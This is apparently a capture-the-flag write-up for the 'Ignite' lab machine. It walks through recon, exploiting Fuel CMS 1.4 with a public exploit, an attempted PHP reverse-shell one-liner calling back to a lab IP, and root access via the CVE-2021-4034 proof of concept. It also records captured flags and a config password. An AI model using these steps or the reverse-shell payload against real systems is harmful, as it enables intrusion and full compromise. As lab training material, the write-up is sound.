# Ignite

Notes.

## recon

### nmap

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 02:59:76:57:60:27 (Unknown)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.10 - 3.13
Network Distance: 1 hop
```

### gobuster
```
/!ut                  (Status: 400) [Size: 1134]
/!_images             (Status: 400) [Size: 1134]
/!res                 (Status: 400) [Size: 1134]
/!images              (Status: 400) [Size: 1134]
/!                    (Status: 400) [Size: 1134]
/!_archives           (Status: 400) [Size: 1134]
/!textove_diskuse     (Status: 400) [Size: 1134]
/!backup              (Status: 400) [Size: 1134]
/.htaccess            (Status: 403) [Size: 297]
/0                    (Status: 200) [Size: 16597]
/.htpasswd            (Status: 403) [Size: 297]
/@                    (Status: 400) [Size: 1134]
/[                    (Status: 400) [Size: 1134]
/]                    (Status: 400) [Size: 1134]
/asdfjkl;             (Status: 400) [Size: 1134]
/assets               (Status: 301) [Size: 315] [--> http://10.10.167.168/assets/]
/fixed!               (Status: 400) [Size: 1134]
/home                 (Status: 200) [Size: 16597]
/index                (Status: 200) [Size: 16597]
/lost+found           (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/plain]               (Status: 400) [Size: 1134]
/quote]               (Status: 400) [Size: 1134]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 301]
/sitemap_xml          (Status: 200) [Size: 399]
```


### website

Fuel CMS V 1.4

http://10.10.167.168/robots.txt
```
User-agent: *
Disallow: /fuel/
```

http://10.10.167.168/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d is a login page.


## gaining access


### exploiting fuel

https://www.exploit-db.com/exploits/50477

`└─# python3 50477.py -u http://10.10.167.168`

The goal is to gain a shell on this machine. The input is cleansed however.

This will involve some trial and error.

- .php is not a banned filetype
- if words are appended to the file, they are repeated 13 times. Cannot upload in pieces.
- `Enter Command $echo "php -r '$sock=fsockopen("10.10.105.149",4242);`/bin/sh -i <&3 >&3 2>&3`;'" > hello.php` does not upload.
This seems like re-inventing the wheel...

https://github.com/AssassinUKG/fuleCMS/blob/main/fuelCMS.py opens a shell for us!


https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal to stabalize the shell.


`www-data@ubuntu:/home/www-data$ cat flag.txt `

**6470e394cbf6dab6a91682cc8585059b**

## privesc

No other user accounts.

```
Sudo version 1.8.16
```

```
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

### linpeas

https://linpeas.sh/

```
Vulnerable to CVE-2021-4034
```

```
https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation                                                     
```

```
══════════╣ Searching passwords in config PHP files
        'password' => 'mememe',     
```

### cve-2021-4034

copy https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c

`www-data@ubuntu:/tmp$ gcc -o a a.c `

`www-data@ubuntu:/tmp$ ./a`

`# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)`

**b9bbcb33e11b80be759c4e844862482d**
